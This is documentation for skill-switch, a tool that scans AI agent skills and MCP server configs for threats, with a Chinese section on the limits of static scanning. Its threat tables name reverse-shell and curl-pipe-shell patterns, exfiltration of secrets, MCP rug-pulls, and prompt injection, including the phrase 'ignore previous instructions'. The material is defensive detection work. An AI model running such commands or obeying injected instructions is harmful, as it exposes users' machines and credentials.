# Auditing AI agent skills & MCP servers for security

AI coding agents — Claude Code, Cursor, Gemini CLI, Windsurf, Zed, GitHub Copilot — increasingly run on **skills** (reusable bundles of instructions + tools) and **MCP servers** (Model Context Protocol servers that expose tools to the agent). Both are, at the end of the day, **files and commands the agent will execute on your machine**. A malicious or compromised one can open a reverse shell, exfiltrate your `.env`, phish for credentials, or quietly turn an MCP server hostile after you've trusted it.

This guide explains the threat model and shows how to audit skills and MCP/agent configs with [skill-switch](https://github.com/rtwsvj/skill-switch) — locally, in CI, with zero telemetry.

```bash
npx @rtwsvj/skill-switch audit            # audit this project's skills / configs
npx @rtwsvj/skill-switch audit --configs  # also scan ~/.claude, MCP, and agent configs
```

## Why skills and MCP servers are a security surface

A skill is Markdown + scripts an agent reads and may execute. An MCP server is a process (often `npx some-package`) or a remote endpoint the agent connects to and calls tools on. You accumulate them across several agents, from many authors, and lose the thread: which are installed where, did that one quietly ask for your AWS keys, is the MCP server still exposing the same tools you vetted last week?

Unlike a normal dependency, these run **inside your agent's trust boundary** — with your shell, your files, your tokens.

## The threat landscape

skill-switch ships 80+ detection rules across these categories (full list: [docs/rules.md](rules.md)):

| Threat | What it looks like | Example ruleIds |
|---|---|---|
| **Reverse shells** | `bash -i >& /dev/tcp/host/port`, `nc -e`, python/perl socket shells | `reverse-shell/*` |
| **Remote download-and-execute** | `curl https://… \| sh`, staged `curl + chmod + exec` | `clickfix/curl-pipe-shell`, `staged/*` |
| **Data exfiltration** | reading `.env` / `~/.ssh` / keychains and POSTing them out | `exfiltration/*` |
| **Credential phishing** | instructions telling the agent to ask the user for tokens/passwords | `credential-theft/*` |
| **Supply-chain** | install from unofficial registries, unpinned `npx pkg@latest` | `supply-chain/*` |
| **Dangerous MCP servers** | a server whose `command` wraps a shell payload, or runs unpinned packages | `mcp/shell-wrapper-*`, `mcp/unpinned-package` |
| **MCP credential exposure** | hardcoded secrets in `env`/`headers`, `user:pass@host` URLs, secrets sent to a remote server | `mcp/header-literal-secret`, `mcp/url-embedded-credential`, `mcp/env-secret-to-remote` |
| **Plaintext / over-broad MCP** | `http://` remote transport, `autoApprove: ["*"]`, filesystem scope `/`, `--no-sandbox` | `mcp/remote-http-plaintext`, `mcp/auto-approve-wildcard`, `mcp/broad-filesystem-scope` |
| **Prompt injection / hidden instructions** | zero-width chars, CSS-hidden text, "ignore previous instructions" | `prompt-injection/*` |
| **Obfuscated payloads** | base64 blobs, invisible characters, ANSI/Trojan-Source tricks | `base64-payload/*`, `invisible-chars/*`, `ansi-injection/*` |

## How to audit

**A single skill or a directory of skills:**

```bash
npx @rtwsvj/skill-switch audit ./my-skill
```

**Your installed agent configs** (Claude Code, Gemini CLI, Cursor, VS Code, Windsurf, Zed — `settings.json` and MCP configs):

```bash
npx @rtwsvj/skill-switch audit --configs
```

The audit exits non-zero when it finds blocking issues (critical/high, or a low overall score), so it doubles as a CI gate. Machine-readable output:

```bash
npx @rtwsvj/skill-switch audit --format sarif > results.sarif   # GitHub code-scanning
npx @rtwsvj/skill-switch audit --format json                    # your own tooling
```

## Putting it in CI

Add the GitHub Action to scan every PR:

```yaml
permissions:
  contents: read
  security-events: write     # to upload SARIF to code-scanning
steps:
  - uses: actions/checkout@v4
  - uses: rtwsvj/skill-switch@v0.9.0
    with:
      args: --configs
```

Two things make this **stick in real repos** rather than getting disabled on day one:

- **Baseline** — an existing repo already has findings. Snapshot them once so CI only fails on *new* issues:
  ```bash
  npx @rtwsvj/skill-switch audit --write-baseline .skill-switch-baseline.json   # accept current state
  npx @rtwsvj/skill-switch audit --baseline .skill-switch-baseline.json         # only new findings fail
  ```
  The baseline fingerprint ignores line numbers, so inserting code above a finding doesn't make it look "new".
- **Inline PR annotations** — `--format github` (or `format: github` on the Action) prints each finding right on the PR diff line, no code-scanning setup required.

Tune severity and suppress known-false-positives with a project policy file `.skill-switch-policy.json` (`failOn`, `suppress`).

## The MCP rug-pull problem

A subtle MCP threat: a server that's benign when you install it, then ships an update that adds a malicious tool — a *rug-pull*. Static config audits (above) catch a lot, but detecting rug-pulls requires comparing a server's **live tool list** against a trusted baseline over time. skill-switch covers the static surface today; runtime MCP scanning is on the [roadmap](roadmap.md).

## Principles

- **Local-first, zero telemetry** — nothing is uploaded; everything runs on your machine.
- **Read-only by default** — `audit` never writes; remediation (`--fix`) is opt-in, dry-run first, and always snapshots before touching disk.
- **Honest about blind spots** — see [known limitations](known-limitations.md).

---

## 防护层次:静态装前审计 ≠ 运行时防护

skill-switch 是**纵深防御的第一层**,不是全部。了解它能做什么、不能做什么,反而能让你更放心地用它。

### 第一层的位置与价值

skill-switch 的审计运行在**本地、装前、离线**:

- **本地** — 不上传任何内容,不依赖云端扫描服务。
- **装前** — 在 skill 或 MCP server 被写入 agent 目录**之前**拦截,而不是事后检测。
- **静态** — 分析文件内容和配置声明,不执行任何代码。

这一层覆盖的威胁:

| 威胁类型 | 检测方式 |
|---|---|
| 反向 shell(bash、netcat、Python socket) | `reverse-shell/*` 规则族 |
| 数据外泄指令(curl 传 env/凭据) | `exfiltration/*` 规则族 |
| 凭据钓鱼(要求用户粘贴 token/密码) | `credential-theft/*` 规则族 |
| 危险 MCP server(shell 包装、无钉扎 npx) | `mcp/shell-wrapper-*`、`mcp/unpinned-package` |
| MCP 配置中的硬编码密钥/凭据路径 | `mcp/header-literal-secret`、`mcp/credential-path-access` |
| 隐藏指令(零宽字符、CSS 隐藏文本、"忽略前面的指令") | `prompt-injection/*`、`invisible-chars/*` |
| 混淆载荷(base64 解码后执行、同形字伪装命令) | `base64-payload/*`、`ansi-injection/*` |
| 供应链风险(非正式 registry、无版本钉扎的安装器) | `supply-chain/*` |

完整规则列表: [docs/rules.md](rules.md)

### 静态扫描的诚实上限

学术研究表明,对恶意 AI agent skill 的纯静态扫描准确率存在结构性上限:**SkillSieve(2025) 报告的检测率约为 61.5%**([arxiv.org/abs/2504.09056](https://arxiv.org/abs/2504.09056))。这是行业天花板,不是某个工具的失败。原因在于:

- 静态分析无法追踪**跨文件数据流**(两个无害片段组合后变危险)。
- 静态分析无法检测**间接提示注入**:skill 在运行时拉取外部内容(网页、文件、API 响应),这些外部内容携带的恶意指令只有在 agent 执行时才显现。
- 攻击者可以通过多跳混淆、语义伪装等手段绕过基于模式匹配的规则。

这意味着:**通过 skill-switch 审计不等于该 skill 安全**,只表示它未触发已知静态特征。

### 不覆盖的场景

| 场景 | 原因 |
|---|---|
| **间接提示注入** | skill 执行时拉取的外部网页/文档中嵌入的恶意指令,静态分析时尚未加载 |
| **运行时行为** | skill 装后通过 `run:` / hooks 调用的脚本,实际执行才知道做什么 |
| **MCP rug-pull** | server 审计通过后,作者推送更新改变工具描述或行为,静态签名不变 |
| **跨文件污点组合** | 分散在多个无害文件的片段在 agent 上下文中拼合后才有威胁 |
| **LLM 语义级攻击** | 措辞无害但能操纵模型决策的指令,超出正则/关键词规则的识别范围 |

### 互补的运行时工具

下列工具覆盖 skill-switch 不覆盖的运行时和语义层,与它形成互补:

| 工具 | 层次 | 用途 |
|---|---|---|
| [garak](https://github.com/NVIDIA/garak) | 运行时对抗测试 | 对 LLM/agent 发起对抗提示,检测提示注入、越狱、信息泄露漏洞 |
| [mcp-scan](https://github.com/invariantlabs-ai/mcp-scan) | 运行时 MCP 审计 | 连接 MCP server 拉取实时工具清单,检测 tool 描述注入和 rug-pull |
| [llm-guard](https://github.com/protectai/llm-guard) | 输入/输出净化 | 在 LLM 调用链中过滤提示注入和敏感数据泄露 |

### 推荐的分层实践

```
装前          →  skill-switch audit (本文档)   静态、本地、零遥测
运行时测试    →  garak                          对抗提示、越狱检测
MCP 运行时    →  mcp-scan                       tool 描述 hash 钉扎、rug-pull 检测
调用链防护    →  llm-guard                      输入输出净化
```

没有哪一层单独足够;组合使用才能覆盖更大的攻击面。

---

Full rule reference: [docs/rules.md](rules.md) · CI setup: [docs/github-action.md](github-action.md) · Project: [github.com/rtwsvj/skill-switch](https://github.com/rtwsvj/skill-switch)
